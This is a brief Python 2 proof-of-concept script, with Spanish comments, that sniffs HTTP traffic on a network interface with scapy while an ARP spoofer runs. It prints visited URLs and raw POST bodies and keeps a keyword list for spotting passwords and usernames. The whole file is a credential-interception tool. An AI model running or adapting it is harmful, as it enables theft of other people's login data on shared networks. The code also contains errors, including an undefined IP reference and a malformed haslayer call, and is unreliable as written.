#!/usr/bin/python

#pip install scapy_http
#Esto es una PoC, no tiene mucha utilidad al no implementar nada para HTTPS, o eso creo, que no funcionaría.
#Para que funcione tienes que tener el ARP spoofer iniciado, si no mirará a tus paquetes.

import scapy.all as scapy
from scapy_http import http

def sniff(interface):
    scapy.sniff(iface= interface, store=False, prn= process_packets)

def process_packets(packet):
    if packet.haslayer(http.HTTPRequest):

        url = packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
        ip = packet[IP].src
        method = packet[http.HTTPRequest].Method.decode()


        print url
        if packet.haslayer[scapy.Raw] and method == "POST":
            load= packet[scapy.Raw].load
            print 'Some useful RAW data: '+ packet[scapy.Raw].load
            
            '''for x in words:
                if x in str(load):
                    print load
                    break'''


words = ["password", "user", "username", "login","pass","User", "Password"]
sniff("eth0")